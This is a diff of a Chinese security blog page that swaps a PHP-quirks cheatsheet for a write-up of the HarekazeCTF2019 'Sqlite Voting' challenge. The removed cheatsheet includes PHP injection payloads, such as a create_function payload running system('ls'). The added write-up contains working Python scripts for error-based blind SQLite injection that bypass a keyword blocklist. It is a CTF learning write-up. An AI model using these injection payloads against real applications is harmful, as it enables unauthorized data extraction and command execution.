@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="php特性, Keep-Boom">
+    <meta name="keywords" content="浅析SQLite注入, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>php特性 | Keep-Boom</title>
+    <title>浅析SQLite注入 | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">php特性</h1>
+                    <h1 class="description center-align post-title">浅析SQLite注入</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-05-25
+                    2021-07-26
                 </div>
                 
 
@@ -459,75 +459,171 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h5 id="basename"><a href="#basename" class="headerlink" title="basename"></a><strong>basename</strong></h5><pre><code>$path=&#39;/source/index.php&#39;;
-var_dump(basename($path));
-=&gt;index.php
+                <p>s</p>
+<h4 id="从一道题谈SQLite盲注"><a href="#从一道题谈SQLite盲注" class="headerlink" title="从一道题谈SQLite盲注"></a>从一道题谈SQLite盲注</h4><h5 id="题目：-HarekazeCTF2019-Sqlite-Voting"><a href="#题目：-HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="题目：[HarekazeCTF2019]Sqlite Voting"></a>题目：[HarekazeCTF2019]Sqlite Voting</h5><ul>
+<li><h5 id="在-vote-php-页面-POST-参数-id-。并且在-schema-sql-中发现了-flag-在flag表中。"><a href="#在-vote-php-页面-POST-参数-id-。并且在-schema-sql-中发现了-flag-在flag表中。" class="headerlink" title="在 vote.php 页面 POST 参数 id 。并且在 schema.sql 中发现了 flag 在flag表中。"></a>在 <code>vote.php</code> 页面 <code>POST</code> 参数 <code>id</code> 。并且在 <code>schema.sql</code> 中发现了 <code>flag</code> 在<code>flag</code>表中。</h5></li>
+</ul>
+<pre class=" language-sqlite"><code class="language-sqlite">#schema.sql
 
-$path=&#39;/source/index.php/&#39;.urldecode(%99);
-var_dump(basename($path));
-=&gt;index.php
-basename这个函数会去掉文件名开头的非ASCII值</code></pre>
-<h5 id="create-fucntion"><a href="#create-fucntion" class="headerlink" title="create_fucntion"></a><strong>create_fucntion</strong></h5><pre><code>create_function(&#39;$a,$b&#39;,&#39;return $a+$b&#39;)
-想当于
-function lambda1(a,b)&#123;
-rerutn a+b;
-&#125;
+DROP TABLE IF EXISTS `vote`;
+  CREATE TABLE `vote` (
+    `id` INTEGER PRIMARY KEY AUTOINCREMENT,
+    `name` TEXT NOT NULL,
+    `count` INTEGER
+  );
+  INSERT INTO `vote` (`name`, `count`) VALUES
+    ('dog', 0),
+    ('cat', 0),
+    ('zebra', 0),
+    ('koala', 0);
 
-利用
-$a = $_GET[&#39;a&#39;];
-create_function(&#39;&#39;,$a);
+  DROP TABLE IF EXISTS `flag`;
+  CREATE TABLE `flag` (
+    `flag` TEXT NOT NULL
+  );
+  INSERT INTO `flag` VALUES ('HarekazeCTF&#123;<redacted>&#125;');</code></pre>
+<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#vote.php</span>
 
-payload:
-?a=&#125;echo system(&#39;ls&#39;);//</code></pre>
-<h5 id="ereg"><a href="#ereg" class="headerlink" title="ereg"></a><strong>ereg</strong></h5><pre><code>可以用%00绕过匹配
+ <span class="token delimiter">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])===FALSE)  &#123;
-    die(&#39;error&#39;);
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
 
-&#125;
-//只有36d的人才能看到flag
-if(intval(strrev($_GET[&#39;c&#39;]))==0x36d)&#123;
-    echo $flag;
-&#125;
+<span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token comment" spellcheck="true">// dangerous chars</span>
+    <span class="token comment" spellcheck="true">// " % ' * + / </span><span class="token markup">&lt; = ></span> \ _ ` <span class="token operator">~</span> <span class="token operator">-</span>
+    <span class="token string">"[\"%'*+\\/&lt;=>\\\\_`~-]"</span><span class="token punctuation">,</span>
+    <span class="token comment" spellcheck="true">// whitespace chars</span>
+    <span class="token string">'\s'</span><span class="token punctuation">,</span>
+    <span class="token comment" spellcheck="true">// dangerous functions</span>
+    <span class="token string">'blob'</span><span class="token punctuation">,</span> <span class="token string">'load_extension'</span><span class="token punctuation">,</span> <span class="token string">'char'</span><span class="token punctuation">,</span> <span class="token string">'unicode'</span><span class="token punctuation">,</span>
+    <span class="token string">'(in|sub)str'</span><span class="token punctuation">,</span> <span class="token string">'[lr]trim'</span><span class="token punctuation">,</span> <span class="token string">'like'</span><span class="token punctuation">,</span> <span class="token string">'glob'</span><span class="token punctuation">,</span> <span class="token string">'match'</span><span class="token punctuation">,</span> <span class="token string">'regexp'</span><span class="token punctuation">,</span>
+    <span class="token string">'in'</span><span class="token punctuation">,</span> <span class="token string">'limit'</span><span class="token punctuation">,</span> <span class="token string">'order'</span><span class="token punctuation">,</span> <span class="token string">'union'</span><span class="token punctuation">,</span> <span class="token string">'join'</span>
+  <span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/i'</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
 
-payload
-?c=a%00778</code></pre>
-<h5 id="intval"><a href="#intval" class="headerlink" title="intval"></a><strong>intval</strong></h5><pre><code>如果 base 是 0，通过检测 var 的格式来决定使用的进制：
-如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，
-如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，
-将使用 10 进制 (decimal)。
-intval(&#39;4476.0&#39;)===4476    小数点  
-intval(&#39;+4476.0&#39;)===4476   正负号
-intval(&#39;4476e0&#39;)===4476    科学计数法
-intval(&#39;0x117c&#39;)===4476    16进制
-intval(&#39;010574&#39;)===4476    8进制
-intval(&#39; 010574&#39;)===4476   8进制+空格
-intval无法处理数组</code></pre>
-<pre><code>&lt;?=`cat *`;
-base64 &lt;==&gt;PD89YGNhdCAqYDs
-hex2bin &lt;==&gt;5044383959474e6864434171594473</code></pre>
-<h5 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a><strong>preg_replace</strong></h5><pre><code>在/e模式下，会把替换成的参数当作PHP代码执行。
-/e模式在PHP7已经被删除
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: text/json; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-\\1表示匹配子查询的第一个内容 \\2则表示第二个
-?\S*=$&#123;phpinfo()&#125;
-$&#123;&#125;会把里面的代码当作变量执行</code></pre>
-<h5 id="switch"><a href="#switch" class="headerlink" title="switch"></a><strong>switch</strong></h5><pre><code>var_dump(highlight_file(__FILE__));
-=&gt;bool(true)
+<span class="token comment" spellcheck="true">// check user input</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'error'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'You must specify vote id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'error'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'Vote id contains dangerous chars'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
 
-$a = highlight_file(__FILE__);
-witch($a)&#123;
-    case &quot;upload&quot;:
-        echo 1;
-        break;
-    case &quot;download&quot;:
-        echo 2;
-        break;
-&#125;
-=&gt; 1;</code></pre>
-<h5 id="mb-strtolower"><a href="#mb-strtolower" class="headerlink" title="mb_strtolower"></a>mb_strtolower</h5><pre><code>%c4%b0 urldecode=&gt; İ
-var_dump(mb_strtolower(&#39;İ&#39;)===&#39;i&#39;);
-=&gt;True</code></pre>
+<span class="token comment" spellcheck="true">// update database</span>
+<span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">'sqlite:../db/vote.db'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"UPDATE vote SET count = count + 1 WHERE id = $&amp;#123;id&amp;#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'error'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'An error occurred while updating database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+<span class="token comment" spellcheck="true">// succeeded!</span>
+<span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
+  <span class="token string">'message'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'Thank you for your vote! The result will be published after the CTF finished.'</span>
+<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre>
+<ul>
+<li><code>update</code>成功与否会输出不同的内容，首先思考尝试盲注，但是可以看到对传入的参数进行了<code>is_valid</code>过滤，<code>&#39;</code>,<code>&quot;</code>，<code>char</code>都被过滤了。</li>
+<li>但在 <code>sqlite3</code> 中，<code>abs</code> 函数有一个整数溢出的报错，如果 <code>abs</code> 的参数是 <code>-9223372036854775808</code> 就会报错，同样如果是正数也会报错。</li>
+<li>那么如何利用<code>abs</code>报错进行注入呢？可以通过<code>hex</code>编码，再进行<code>length</code>与2的次幂进行<code>&amp;</code>位与,再进行<code>|</code>位或，得到<code>flag</code>的长度。</li>
+</ul>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+  url <span class="token operator">=</span> <span class="token string">"http://b78ec9e2-94dc-491d-b67f-58dd21a9ad49.node4.buuoj.cn/vote.php"</span>
+  l <span class="token operator">=</span> <span class="token number">0</span>
+  <span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> f<span class="token string">'abs(case(length(hex((select(flag)from(flag))))&amp;&amp;#123;1&lt;&lt;n&amp;#125;)when(0)then(0)else(0x8000000000000000)end)'</span>
+    data <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+        <span class="token string">'id'</span> <span class="token punctuation">:</span> payload
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">'occurred'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+        l <span class="token operator">=</span> l<span class="token operator">|</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>n
+
+  <span class="token keyword">print</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#l=>84</span></code></pre>
+<ul>
+<li>得到长度就考虑逐个字符判断，注出flag的16进制字符串。但<code>&#39;</code>,<code>&quot;</code>都被过滤了，怎么办呢？这一题对盲注语句的构造很巧妙，首先利用如下语句分别构造出 <code>ABCDEF</code> ，这样十六进制的所有字符都可以使用了，并且使用 <code>trim(0,0)</code> 来表示空字符。</li>
+</ul>
+<pre><code># 除去 12567 就是 A ，其余同理
+A = &#39;trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)&#39;
+
+C = &#39;trim(hex(typeof(.1)),12567)&#39;
+
+D = &#39;trim(hex(0xffffffffffffffff),123)&#39;
+
+E = &#39;trim(hex(0.1),1230)&#39;
+
+F = &#39;trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)&#39;
+
+# hex(b&#39;koala&#39;) = 6B6F616C61
+# 除去 16CF 就是 B
+B = f&#39;trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||&#123;C&#125;||&#123;F&#125;)&#39;</code></pre>
+<p>这样16进制所有字符就都有了。</p>
+<ul>
+<li>然后逐字符进行爆破，已经知道 flag 格式为 <code>flag&#123;&#125;</code> ，<code>hex(b&#39;flag&#123;&#39;)==666C61677B</code> ，在其后面逐位添加十六进制字符，构成 paylaod</li>
+<li>再利用 <code>replace(length(replace(flag,payload,&#39;&#39;))),84,&#39;&#39;)</code> 这个语句进行判断</li>
+<li>如果 flag 不包含 payload ，那么得到的 <code>length</code> 必为 84 ，最外面的 <code>replace</code> 将返回 <code>false</code> ，通过 <code>case when then else</code> 构造 <code>abs</code> 参数为 <code>0</code> ，它不报错</li>
+<li>如果 flag 包含 payload ，那么 <code>replace(flag, payload, &#39;&#39;)</code> 将 flag 中的 payload 替换为空，得到的 <code>length</code> 必不为 84 ，最外面的 <code>replace</code> 将返回 <code>true</code> ，通过 <code>case when then else</code> 构造 <code>abs</code> 参数为 <code>0x8000000000000000</code> 令其报错</li>
+</ul>
+<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding: utf-8</span>
+<span class="token keyword">import</span> binascii
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+URL <span class="token operator">=</span> <span class="token string">'http://b78ec9e2-94dc-491d-b67f-58dd21a9ad49.node4.buuoj.cn/vote.php'</span>
+
+
+l <span class="token operator">=</span> <span class="token number">0</span>
+i <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+    <span class="token string">'id'</span><span class="token punctuation">:</span> f<span class="token string">'abs(case(length(hex((select(flag)from(flag))))&amp;&amp;#123;1&lt;&lt;j&amp;#125;)when(0)then(0)else(0x8000000000000000)end)'</span>
+  <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;)</span>
+  <span class="token keyword">if</span> b<span class="token string">'An error occurred'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+    l <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> j
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] length:'</span><span class="token punctuation">,</span> l<span class="token punctuation">)</span>
+
+
+table <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125;</span>
+table<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(id=3))),12567)'</span>
+table<span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(typeof(.1)),12567)'</span>
+table<span class="token punctuation">[</span><span class="token string">'D'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(0xffffffffffffffff),123)'</span>
+table<span class="token punctuation">[</span><span class="token string">'E'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(0.1),1230)'</span>
+table<span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span>
+table<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||&amp;#123;table["C"]&amp;#125;||&amp;#123;table["F"]&amp;#125;)'</span>
+
+
+res <span class="token operator">=</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>b<span class="token string">'flag&amp;#123;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token string">'0123456789ABCDEF'</span><span class="token punctuation">:</span>
+    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
+    t <span class="token operator">=</span> <span class="token string">'||'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>c <span class="token keyword">if</span> c <span class="token keyword">in</span> <span class="token string">'0123456789'</span> <span class="token keyword">else</span> table<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> res <span class="token operator">+</span> x<span class="token punctuation">)</span>
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+      <span class="token string">'id'</span><span class="token punctuation">:</span> f<span class="token string">'abs(case(replace(length(replace(hex((select(flag)from(flag))),&amp;#123;t&amp;#125;,trim(0,0))),&amp;#123;l&amp;#125;,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;)</span>
+    <span class="token keyword">if</span> b<span class="token string">'An error occurred'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+      res <span class="token operator">+=</span> x
+      <span class="token keyword">break</span>
+  <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'[+] flag (&amp;#123;i&amp;#125;/&amp;#123;l&amp;#125;): &amp;#123;res&amp;#125;'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>f<span class="token string">'&amp;#123;res&amp;#125;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p><code>||</code>在SQLite中是连接符</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6628#toc-4">https://xz.aliyun.com/t/6628#toc-4</a></p>
+<p>总结，除了sqlite3有溢出报错，mysql同样也存在溢出报错。利用<code>trim()</code>来绕过空字符，利用<code>length</code>,<code>abs</code>,<code>replace</code>，<code>case</code>进行注入,利用<code>&amp;</code>,<code>|</code>来获取长度。</p>
+<p><img src="/images/118.png"></p>
 
             </div>
             <hr/>
@@ -553,7 +649,7 @@ var_dump(mb_strtolower(&#39;İ&#39;)===&#39;i&#39;);
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/05/25/php%E7%89%B9%E6%80%A7/">http://example.com/2021/05/25/php%E7%89%B9%E6%80%A7/</a>
+                    <a href="http://example.com/2021/07/26/%E6%B5%85%E6%9E%90SQLite%E6%B3%A8%E5%85%A5/">http://example.com/2021/07/26/%E6%B5%85%E6%9E%90SQLite%E6%B3%A8%E5%85%A5/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -762,13 +858,13 @@ var_dump(mb_strtolower(&#39;İ&#39;)===&#39;i&#39;);
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/05/27/cve-2018-12613-PhpMyadmin%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+                <a href="/2021/07/26/ECB%E5%8A%A0%E5%AF%86/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="cve-2018-12613-PhpMyadmin后台文件包含">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="ECB加密">
                         
-                        <span class="card-title">cve-2018-12613-PhpMyadmin后台文件包含</span>
+                        <span class="card-title">ECB加密</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -779,7 +875,7 @@ var_dump(mb_strtolower(&#39;İ&#39;)===&#39;i&#39;);
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-27
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-26
                         </span>
                         <span class="publish-author">
                             
@@ -799,13 +895,13 @@ var_dump(mb_strtolower(&#39;İ&#39;)===&#39;i&#39;);
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/05/24/php%E7%BC%96%E7%A0%81Rce/">
+                <a href="/2021/07/25/%E9%80%9A%E8%BE%BEOA/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="php编码Rce">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="通达OA">
                         
-                        <span class="card-title">php编码Rce</span>
+                        <span class="card-title">通达OA</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -816,7 +912,7 @@ var_dump(mb_strtolower(&#39;İ&#39;)===&#39;i&#39;);
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-25
                             </span>
                         <span class="publish-author">
                             
